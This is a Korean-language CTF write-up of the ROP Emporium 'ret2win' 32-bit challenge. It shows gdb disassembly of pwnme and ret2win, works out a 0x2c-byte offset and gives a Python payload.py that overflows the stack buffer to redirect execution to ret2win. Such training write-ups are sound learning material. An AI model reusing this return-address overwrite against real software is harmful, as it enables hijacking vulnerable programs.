---
title: ROP Emporium ret2win 문제 풀이
date: 2026-11-12
category: ctfwargame
tags:
  - pwnable
  - ret2win
  - evision
---
\### ls -l



\`\``

\-rw-r--r-- 1 ubuntu ubuntu   33 Jul  3  2020 flag.txt

\-rwxr-xr-x 1 ubuntu ubuntu 7408 Jul  3  2020 ret2win32

\`\``



\-   소스코드 분석 불가



\### (gdb) info functions



\`\``

Non-debugging symbols:

0x08048374  _init

0x080483b0  read@plt

0x080483c0  printf@plt

0x080483d0  puts@plt

0x080483e0  system@plt

0x080483f0  __libc_start_main@plt

0x08048400  setvbuf@plt

0x08048410  memset@plt

0x08048420  __gmon_start__@plt

0x08048430  _start

0x08048470  _dl_relocate_static_pie

0x08048480  __x86.get_pc_thunk.bx

0x08048490  deregister_tm_clones

0x080484d0  register_tm_clones

0x08048510  __do_global_dtors_aux

0x08048540  frame_dummy

0x08048546  main

0x080485ad  pwnme

0x0804862c  ret2win

0x08048660  __libc_csu_init

0x080486c0  __libc_csu_fini

0x080486c4  _fini

\`\``



\### (gdb) disas pwnme



\`\``

(gdb) disas pwnme

Dump of assembler code for function pwnme:

   \*\*0x080485ad <+0>:	push   ebp

   0x080485ae <+1>:	mov    ebp,esp

   0x080485b0 <+3>:	sub    esp,0x28\*\*

   0x080485b3 <+6>:	sub    esp,0x4

   0x080485b6 <+9>:	push   0x20

   0x080485b8 <+11>:	push   0x0

   0x080485ba <+13>:	lea    eax,\[ebp-0x28]

   0x080485bd <+16>:	push   eax

   0x080485be <+17>:	call   0x8048410 <memset@plt>

   0x080485c3 <+22>:	add    esp,0x10

   0x080485c6 <+25>:	sub    esp,0xc

   0x080485c9 <+28>:	push   0x8048708

   0x080485ce <+33>:	call   0x80483d0 <puts@plt>

   0x080485d3 <+38>:	add    esp,0x10

   0x080485d6 <+41>:	sub    esp,0xc

   0x080485d9 <+44>:	push   0x8048768

   0x080485de <+49>:	call   0x80483d0 <puts@plt>

   0x080485e3 <+54>:	add    esp,0x10

   0x080485e6 <+57>:	sub    esp,0xc

   0x080485e9 <+60>:	push   0x8048788

   0x080485ee <+65>:	call   0x80483d0 <puts@plt>

   0x080485f3 <+70>:	add    esp,0x10

   0x080485f6 <+73>:	sub    esp,0xc

   0x080485f9 <+76>:	push   0x80487e8

   0x080485fe <+81>:	call   0x80483c0 <printf@plt>

   0x08048603 <+86>:	add    esp,0x10

   0x08048606 <+89>:	sub    esp,0x4

   0x08048609 <+92>:	push   0x38

   \*\*0x0804860b <+94>:	lea    eax,\[ebp-0x28]

   0x0804860e <+97>:	push   eax

   0x0804860f <+98>:	push   0x0

   0x08048611 <+100>:	call   0x80483b0 <read@plt>\*\*

   0x08048616 <+105>:	add    esp,0x10

   0x08048619 <+108>:	sub    esp,0xc

   0x0804861c <+111>:	push   0x80487eb

   0x08048621 <+116>:	call   0x80483d0 <puts@plt>

   0x08048626 <+121>:	add    esp,0x10

   0x08048629 <+124>:	nop

   0x0804862a <+125>:	leave

   0x0804862b <+126>:	ret

End of assembler dump.

\`\``



\-   read()에 넣고 있는 부분이 버퍼임을 알 수 있음



\| return addr |   |

\| --- | --- |

\| saved ebp | ←ebp |

\|       .. buf..          |       ← ebp-0x28 |



\-   버퍼의 크기 = 32+8 = 40바이트 (10칸)



\### (gdb) disas ret2win



\`\``

(gdb) disas ret2win

Dump of assembler code for function ret2win:

   0x0804862c <+0>:	push   ebp

   0x0804862d <+1>:	mov    ebp,esp

   0x0804862f <+3>:	sub    esp,0x8

   0x08048632 <+6>:	sub    esp,0xc

   0x08048635 <+9>:	push   0x80487f6

   0x0804863a <+14>:	call   0x80483d0 <puts@plt>

   0x0804863f <+19>:	add    esp,0x10

   0x08048642 <+22>:	sub    esp,0xc

   0x08048645 <+25>:	push   0x8048813

   0x0804864a <+30>:	call   0x80483e0 <system@plt>

   0x0804864f <+35>:	add    esp,0x10

   0x08048652 <+38>:	nop

   0x08048653 <+39>:	leave

   0x08048654 <+40>:	ret

End of assembler dump.

\`\``



\-   타겟 함수



\### (gdb) p ret2win



\`\``

(gdb) p ret2win

$1 = {<text variable, no debug info>} 0x804862c <ret2win>

\`\``



\-   타겟 함수 주소 → little-endian으로 바꾸기

\-   0x804862c = 0x0804862c

\-   08 04 86 2c → \\x2c\\x86\\x04\\x08



\### vim payload.py



\`\``

ubuntu@ksy-vm:~/ret2win$ cat payload.py

\#payload.py

import sys



offset = 0x2c

overwite = b"\x2c\x86\x04\x08"



payload = b"A" * offset + overwite

sys.stdout.buffer.write(payload)

\`\``



\-   offset : 입력 시작 지점부터 덮어쓰고 싶은 위치까지의 바이트 거리

\-   → buf 시작 ~ return addr 이전 메모리까지 바이트수  

\    → 40바이트 + 4바이트(saved ebp) = 0x28 + 0x4 = 0x2c

\-   overwrite : 앞에서 구한 타겟함수의 리틀 엔디안



\### (python3 \[payload.py](http://payload.py/); cat) | ./ret2win32

![](/images/uploads/스크린샷-2026-11-26-오전-12.37.59.png)
